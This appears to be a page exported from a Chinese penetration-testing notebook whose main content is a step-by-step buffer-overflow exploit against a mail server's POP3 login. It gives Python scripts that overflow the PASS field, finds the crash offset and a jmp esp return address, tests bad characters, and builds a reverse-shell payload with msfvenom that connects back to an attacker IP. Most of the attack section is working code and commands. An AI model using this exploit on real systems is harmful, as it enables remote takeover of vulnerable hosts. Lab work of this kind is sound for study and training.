<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>smail案例</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="methodology.html">methodology</a></p>

<ol>
<li><a href="methodology--第一部分_信息收集.html">第一部分 信息收集</a></li>
<ol>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集.html">第1章 端口信息收集</a></li>
<ol>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.1节_21端口ftp.html">第1.1节 21端口ftp</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.2节_22端口ssh.html">第1.2节 22端口ssh</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.3节_25端口SMTP.html">第1.3节 25端口SMTP</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.4节_53端口DNS.html">第1.4节 53端口DNS</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.5节_79端口Finger.html">第1.5节 79端口Finger</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.6节_161端口snmp.html">第1.6节 161端口snmp</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.7节_137-139-445_smb.html">第1.7节 137/139/445 smb</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.8节_389端口ldap.html">第1.8节 389端口ldap</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.9节_2049端口nfs.html">第1.9节 2049端口nfs</a></li>
</ol>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集.html">第2章 web信息收集</a></li>
<ol>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.1节_枚举web目录.html">第2.1节 枚举web目录</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.2节_http方法测试.html">第2.2节 http方法测试</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.3节_https方法测试.html">第2.3节 https方法测试</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.4节_web页面生成字典.html">第2.4节 web页面生成字典</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.5节_web页面图片泄露.html">第2.5节 web页面图片泄露</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.6节_Squid代理.html">第2.6节 Squid代理</a></li>
</ol>
</ol>
<li><a href="methodology--第二部分_漏洞利用.html">第二部分 漏洞利用</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第3章_未知exp的漏洞.html">第3章 未知exp的漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第3章_未知exp的漏洞--第3.1节_搜索exp.html">第3.1节 搜索exp</a></li>
<li><a href="methodology--第二部分_漏洞利用--第3章_未知exp的漏洞--第3.2节_下载exp.html">第3.2节 下载exp</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助.html">第4章 漏洞利用辅助</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.1节_文件字符串分析.html">第4.1节 文件字符串分析</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.2节_webshell.html">第4.2节 webshell</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.3节_反弹shell.html">第4.3节 反弹shell</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.4节_突破受限制的shell.html">第4.4节 突破受限制的shell</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.5节_传输文件.html">第4.5节 传输文件</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.6节_错误处理.html">第4.6节 错误处理</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞.html">第5章 通用漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.1节_登录凭证.html">第5.1节 登录凭证</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.2节_http_PUT方法.html">第5.2节 http PUT方法</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.3节_Shellshock.html">第5.3节 Shellshock</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.4节_任意文件读取LFI.html">第5.4节 任意文件读取LFI</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.5节_远程命令执行.html">第5.5节 远程命令执行</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞.html">第5.6节 sql注入漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞--mysql注入.html">mysql注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞--mssql注入.html">mssql注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞--oracle注入.html">oracle注入</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.7节_上传漏洞.html">第5.7节 上传漏洞</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.8节_Nosql注入.html">第5.8节 Nosql注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.9节_LDAP注入.html">第5.9节 LDAP注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.10节_服务端模板注入.html">第5.10节 服务端模板注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.11节_xxe漏洞.html">第5.11节 xxe漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.11节_xxe漏洞--案例1_excel的xxe.html">案例1: excel的xxe</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.11节_xxe漏洞--案例2_php的xxe执行命令.html">案例2 php的xxe执行命令</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.12节_xpath注入.html">第5.12节 xpath注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.13节_SSRF.html">第5.13节 SSRF</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.14节_Padding_Oracle_Attack.html">第5.14节 Padding Oracle Attack</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞.html">第6章 已知漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.1节_nodejs.html">第6.1节 nodejs</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php.html">第6.2节 php</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--弱类型.html">弱类型</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--php一句话.html">php一句话</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--php代码注入.html">php代码注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--php代码审计.html">php代码审计</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java.html">第6.3节 java</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java--处理excel导致的xxe漏洞.html">处理excel导致的xxe漏洞</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java--java反序列化demo.html">java反序列化demo</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java--Apache_Shiro_rememberMe反序列化.html">Apache Shiro rememberMe反序列化</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.4节_thinkphp.html">第6.4节 thinkphp</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.4节_thinkphp--thinkphp5.0.235.1.31.html">thinkphp<5.0.23<5.1.31</a></li>
</ol>
</ol>
</ol>
<li><a href="methodology--第三部分_权限提升.html">第三部分 权限提升</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权.html">第7章 linux提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.1节_寻找登录凭证.html">第7.1节 寻找登录凭证</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.2节_寻找可写文件.html">第7.2节 寻找可写文件</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.3节_内核提权.html">第7.3节 内核提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.3节_内核提权--案例1_dirtyc0w提权.html">案例1 dirtyc0w提权</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.3节_内核提权--案例2_ubuntu提权.html">案例2 ubuntu提权</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权.html">第7.4节 进程提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.1_mysql.html">4.3.1 mysql</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.2_nfs提权.html">4.3.2 nfs提权</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.3_chkrootkit提权.html">4.3.3 chkrootkit提权</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.4_tar通配符提权.html">4.3.4 tar通配符提权</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.5节_定时任务.html">第7.5节 定时任务</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.6节_sudo提权.html">第7.6节 sudo提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.6节_sudo提权--4.5.1_nmap.html">4.5.1 nmap</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.7节_SUID文件.html">第7.7节 SUID文件</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.8节_root.html">第7.8节 root</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.8节_root--4.7.1_执行命令.html">4.7.1 执行命令</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.8节_root--4.7.2_编辑文件.html">4.7.2 编辑文件</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.9节_劫持全路径.html">第7.9节 劫持全路径</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.10_环境变量.html">第7.10 环境变量</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.11节_破解shadow文件.html">第7.11节 破解shadow文件</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第8章_windows提权.html">第8章 windows提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第8章_windows提权--windows提权辅助.html">windows提权辅助</a></li>
</ol>
</ol>
<li><a href="methodology--第四部分_内网漫游.html">第四部分 内网漫游</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot.html">第9章 Pivot</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.1节_ssh端口转发.html">第9.1节 ssh端口转发</a></li>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.2节_iptables端口转发.html">第9.2节 iptables端口转发</a></li>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.3节_msf后渗透.html">第9.3节 msf后渗透</a></li>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.0节_未整理.html">第9.0节 未整理</a></li>
</ol>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出.html">第10章 缓冲区溢出</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出--第10.1节_windows溢出.html">第10.1节 windows溢出</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出--第10.1节_windows溢出--brainpan.html">brainpan</a></li>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出--第10.1节_windows溢出--smail案例.html">smail案例</a></li>
</ol>
</ol>
<li><a href="methodology--第四部分_内网漫游--metasploit.html">metasploit</a></li>
<li><a href="methodology--第四部分_内网漫游--backdoor.html">backdoor</a></li>
</ol>
<li><a href="methodology--第五部分_挖掘src.html">第五部分 挖掘src</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试.html">10. 业务逻辑测试</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论.html">10.1 业务逻辑理论</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.1_业务逻辑数据一致性.html">6.1.1 业务逻辑数据一致性</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.2_业务逻辑数据完整性.html">6.1.2 业务逻辑数据完整性</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.3_工作流程逃逸测试.html">6.1.3 工作流程逃逸测试</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.4_伪造请求能力测试.html">6.1.4 伪造请求能力测试</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.5_测试处理用时.html">6.1.5 测试处理用时</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--10.1.6_客户端认证.html">10.1.6 客户端认证</a></li>
</ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法.html">10.2 攻击方法</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.1_加密http请求参数.html">6.2.1.1 加密http请求参数</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.2_修改返回包.html">6.2.1.2 修改返回包</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.3_修改http参数.html">6.2.1.3 修改http参数</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.4_去除http请求参数.html">6.2.1.4 去除http请求参数</a></li>
</ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景.html">10.3 业务场景</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.1_用户操作.html">10.3.1 用户操作</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.2_用户注册.html">10.3.2 用户注册</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.3_修改密码.html">10.3.3 修改密码</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.4_验证码安全.html">10.3.4 验证码安全</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.5_订单安全.html">10.3.5 订单安全</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.6_功能使用次数.html">10.3.6 功能使用次数</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.7_客户端验证密码.html">10.3.7 客户端验证密码</a></li>
</ol>
</ol>
<li><a href="methodology--第五部分_挖掘src--11._app安全.html">11. app安全</a></li>
</ol>
<li><a href="methodology--oob.html">oob</a></li>
<li><a href="methodology--DDOS.html">DDOS</a></li>
<ol>
<li><a href="methodology--DDOS--DDOS事件处理.html">DDOS事件处理</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>smail案例</u></b></h1>一 判断存在溢出<br />1. 利用nc判断是否正常通讯<br /><img src="images\78-1.png" alt="images\78-1.png" /><br />2. 编写python脚本进行通讯<br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;socket,sys<br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((sys.argv[<span style="color:#ff0044;font-weight:400">1</span>],<span style="color:#ff0044;font-weight:400">110</span>))<br /><span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">3500</span>*<span style="color:#3ad900;font-weight:400">'A'</span>&nbsp;<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br />s.send(<span style="color:#3ad900;font-weight:400">'USER&nbsp;username'</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'\r\n'</span>)<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br />s.send(<span style="color:#3ad900;font-weight:400">'PASS'</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'\r\n'</span>)<br />s.close()</div></div><br />3. 调试程序异常<br /><img src="images\78-2.png" alt="images\78-2.png" /><br /><br />二 Fuzz定位溢出位置<br />1. 生成<br />/usr/bin/msf-pattern_create -l 3500<br />2. 发送<br /><img src="images\78-3.png" alt="images\78-3.png" /><br />44396944<br />3. 计算<br />/usr/bin/msf-pattern_offset -q 44396944<br />[*] Exact match at offset 2607<br /><img src="images\78-4.png" alt="images\78-4.png" /><br />4. 确认<br />'a'*2607 + 'b'*4  + (3500-2607-4)*'c'<br /><img src="images\78-5.png" alt="images\78-5.png" /><br /><br />三 获取jmp esp地址<br />jmp esp的opcode为FFE4<br />locate nasm_shell<br />/usr/bin/msf-nasm_shell<br />nasm &gt; jmp esp<br />00000000  FFE4              jmp esp<br />寻找FFE4的地址<br />!mona modules<br />!mona find -s "\xFF\xE4" -m SLMFC.DLL <br /><br />四 测试jmp esp的地址<br />0x5f4b41e3 ok<br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;socket,sys<br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((sys.argv[<span style="color:#ff0044;font-weight:400">1</span>],<span style="color:#ff0044;font-weight:400">110</span>))<br /><span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">2607</span>*<span style="color:#3ad900;font-weight:400">'A'</span>&nbsp;+<span style="color:#3ad900;font-weight:400">'\xe3\x41\x4b\x5f'</span>&nbsp;+&nbsp;(<span style="color:#ff0044;font-weight:400">3500</span>-<span style="color:#ff0044;font-weight:400">2607</span>-<span style="color:#ff0044;font-weight:400">4</span>)*<span style="color:#3ad900;font-weight:400">'c'</span><br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br />s.send(<span style="color:#3ad900;font-weight:400">'USER&nbsp;username'</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'\r\n'</span>)<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br />s.send(<span style="color:#3ad900;font-weight:400">'PASS'</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'\r\n'</span>)<br />s.close()</div></div><br /><br />五 测试bad chars<br /><div class="codebox"><div class="codebox">badchars&nbsp;=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"<br />"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"<br />"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"<br />"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"<br />"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"<br />"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"<br />"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"<br />"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"<br />"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"<br />"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"<br />"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"<br />"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"<br />"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"<br />"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"<br />"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"<br />"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")</div></div><br /><br />注意:测试badchar时，要将jmp esp的地址改为bbbb,防止跳转后找不到栈里面的数据。<br />0x00  截断<br />0x0A 截断<br />0x0D 被忽略掉<br /><br />六 生成shellcode<br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp&nbsp;LHOST=192.168.122.4&nbsp;LPORT=1234&nbsp;-f&nbsp;c&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;windows&nbsp;-b&nbsp;<span style="color:#3ad900;font-weight:400">"\x00\x0a\x0d"</span>&nbsp;-e&nbsp;x86<span style="color:#ff9d00;font-weight:700">/</span>shikata_ga_nai</div></div><br /><br />jmp esp + 4*'\x90\x90\x90\x90' + shellcode<br /><img src="images\78-6.png" alt="images\78-6.png" /><br /><br /><br /><br /><br /><br /><br /></div></div>
</body></html>